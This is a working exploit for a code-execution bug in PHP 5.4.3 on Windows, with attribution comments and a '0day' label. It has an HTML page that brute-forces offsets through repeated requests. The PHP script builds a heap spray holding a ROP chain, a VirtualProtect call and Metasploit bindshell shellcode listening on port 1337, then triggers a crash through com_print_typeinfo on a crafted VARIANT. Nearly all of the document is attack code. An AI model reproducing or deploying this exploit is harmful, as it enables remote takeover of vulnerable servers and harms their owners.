// Exploit Title: PHP 5.4 (5.4.3) Code Execution 0day (Win32)
// Exploit author: 0in (Maksymilian Motyl)
// Email: 0in(dot)email(at)gmail.com
// * Bug with Variant type parsing originally discovered by Condis
// Tested on Windows XP SP3 fully patched (Polish)


===================
 offset-brute.html
===================

<html><body>
<title>0day</title>
<center>
<font size=7>PHP 5.4.3 0day by 0in & cOndis</font><br>
<textarea rows=50 cols=50 id="log">&lt;/textarea&gt;
</center>
<script>
function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;
    }
  }
}
function makeRequest(url, parameters)
{
    var xmlhttp = new XMLHttpRequest();
    if (window.XMLHttpRequest) {
        xmlhttp = new XMLHttpRequest();
        if (xmlhttp.overrideMimeType) {
            xmlhttp.overrideMimeType('text/xml');
        }
    } else if (window.ActiveXObject) {
        // IE
        try { xmlhttp = new ActiveXObject("Msxml2.XMLHTTP"); }
        catch (e) {
            try { xmlhttp = new ActiveXObject("Microsoft.XMLHTTP"); }
            catch (e) {}
        }
    }

    if (!xmlhttp) {
        alert('Giving up :( Cannot create an XMLHTTP instance');
        return false;
    }

	xmlhttp.open("GET",url,true);
	xmlhttp.send(null);
    return true;
}
test=document.getElementById("log");
for(offset=0;offset<300;offset++)
{
	log.value+="Trying offset:"+offset+"\r\n";
	makeRequest("0day.php?offset="+offset);
	sleep(500);
}

</script></body></html>



===================
     0day.php
===================

<?php 

$spray = str_repeat("\x90",0x200); 
$offset=$_GET['offset'];
// 775DF0Da   # ADD ESP,10 # RETN    ** [ole32.dll] 
$spray = substr_replace($spray, "\xda\xf0\x5d\x77", (strlen($spray))*-1,(strlen($spray))*-1); 
// :> 0x048d0030
$spray = substr_replace($spray, pack("L",0x048d0030+$offset), (strlen($spray)-0x8)*-1,(strlen($spray))*-1); 

//0x7752ae9f (RVA : 0x0005ae7f) : # XCHG EAX,ESP # MOV ECX,468B0000 # OR AL,3 # RETN   [ole32.dll]
$spray = substr_replace($spray, "\x9f\xae\x52\x77", (strlen($spray)-0x10)*-1,(strlen($spray))*-1); 

// Adress of VirtualProtect 0x7c801ad4
$spray = substr_replace($spray, "\xd4\x1a\x80\x7c", (strlen($spray)-0x14)*-1,(strlen($spray))*-1);

//  LPVOID lpAddress  = 0x048d0060
$spray = substr_replace($spray, pack("L",0x048d0060+$offset), (strlen($spray)-0x1c)*-1,(strlen($spray))*-1);

// SIZE_T dwSize  = 0x01000000 
$spray = substr_replace($spray, "\x00\x00\x10\x00", (strlen($spray)-0x20)*-1,(strlen($spray))*-1);

// DWORD flNewProtect =  PAGE_EXECUTE_READWRITE (0x00000040) | 0xffffffc0 
$spray = substr_replace($spray, "\x40\x00\x00\x00", (strlen($spray)-0x24)*-1,(strlen($spray))*-1);
// __out  PDWORD lpflOldProtect = 0x04300070 | 0x105240000

// 0x048d0068
$spray = substr_replace($spray, pack("L",0x048d0068+$offset), (strlen($spray)-0x28)*-1,(strlen($spray))*-1);

//0x77dfe8b4 : # XOR EAX,EAX # ADD ESP,18 # INC EAX # POP EBP # RETN 0C    ** [ADVAPI32.dll]
$spray = substr_replace($spray, "\xb4\xe8\xdf\x77", (strlen($spray)-0x18)*-1,4); 
// Ret Address = 0x048d0080 
$spray = substr_replace($spray, pack("L",0x048d0080+$offset), (strlen($spray)-0x48)*-1,4); 



$stacktrack = "\xbc\x0c\xb0\xc0\x00"; 
// Universal win32 bindshell on port 1337 from metasploit
$shellcode = $stacktrack."\x33\xc9\x83\xe9\xb0".
  "\x81\xc4\xd0\xfd\xff\xff".
  "\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x1d".
  "\xcc\x32\x69\x83\xeb\xfc\xe2\xf4\xe1\xa6\xd9\x24\xf5\x35\xcd\x96".
  "\xe2\xac\xb9\x05\x39\xe8\xb9\x2c\x21\x47\x4e\x6c\x65\xcd\xdd\xe2".
  "\x52\xd4\xb9\x36\x3d\xcd\xd9\x20\x96\xf8\xb9\x68\xf3\xfd\xf2\xf0".
  "\xb1\x48\xf2\x1d\x1a\x0d\xf8\x64\x1c\x0e\xd9\x9d\x26\x98\x16\x41".
  "\x68\x29\xb9\x36\x39\xcd\xd9\x0f\x96\xc0\x79\xe2\x42\xd0\x33\x82".
  "\x1e\xe0\xb9\xe0\x71\xe8\x2e\x08\xde\xfd\xe9\x0d\x96\x8f\x02\xe2".
  "\x5d\xc0\xb9\x19\x01\x61\xb9\x29\x15\x92\x5a\xe7\x53\xc2\xde\x39".
  "\xe2\x1a\x54\x3a\x7b\xa4\x01\x5b\x75\xbb\x41\x5b\x42\x98\xcd\xb9".
  "\x75\x07\xdf\x95\x26\x9c\xcd\xbf\x42\x45\xd7\x0f\x9c\x21\x3a\x6b".
  "\x48\xa6\x30\x96\xcd\xa4\xeb\x60\xe8\x61\x65\x96\xcb\x9f\x61\x3a".
  "\x4e\x9f\x71\x3a\x5e\x9f\xcd\xb9\x7b\xa4\x37\x50\x7b\x9f\xbb\x88".
  "\x88\xa4\x96\x73\x6d\x0b\x65\x96\xcb\xa6\x22\x38\x48\x33\xe2\x01".
  "\xb9\x61\x1c\x80\x4a\x33\xe4\x3a\x48\x33\xe2\x01\xf8\x85\xb4\x20".
  "\x4a\x33\xe4\x39\x49\x98\x67\x96\xcd\x5f\x5a\x8e\x64\x0a\x4b\x3e".
  "\xe2\x1a\x67\x96\xcd\xaa\x58\x0d\x7b\xa4\x51\x04\x94\x29\x58\x39".
  "\x44\xe5\xfe\xe0\xfa\xa6\x76\xe0\xff\xfd\xf2\x9a\xb7\x32\x70\x44".
  "\xe3\x8e\x1e\xfa\x90\xb6\x0a\xc2\xb6\x67\x5a\x1b\xe3\x7f\x24\x96".
  "\x68\x88\xcd\xbf\x46\x9b\x60\x38\x4c\x9d\x58\x68\x4c\x9d\x67\x38".
  "\xe2\x1c\x5a\xc4\xc4\xc9\xfc\x3a\xe2\x1a\x58\x96\xe2\xfb\xcd\xb9".
  "\x96\x9b\xce\xea\xd9\xa8\xcd\xbf\x4f\x33\xe2\x01\xf2\x02\xd2\x09".
  "\x4e\x33\xe4\x96\xcd\xcc\x32\x69";


$spray = substr_replace($spray,$shellcode, (strlen($spray)-0x50)*-1,(strlen($shellcode))); 
$fullspray="";
for($i=0;$i<0x4b00;$i++)
{
	$fullspray.=$spray;
}
$j=array();
$e=array();
$b=array();
$a=array();
$c=array();

array_push($j,$fullspray);
array_push($e,$fullspray."W");
array_push($b,$fullspray."A");
array_push($a,$fullspray."S");
array_push($c,$fullspray."!");


$vVar = new VARIANT(0x048d0038+$offset); 
// Shoot him
com_print_typeinfo($vVar); //CRASH -> 102F3986   FF50 10          CALL DWORD PTR DS:[EAX+10]

echo $arr;

echo $spray;

?>

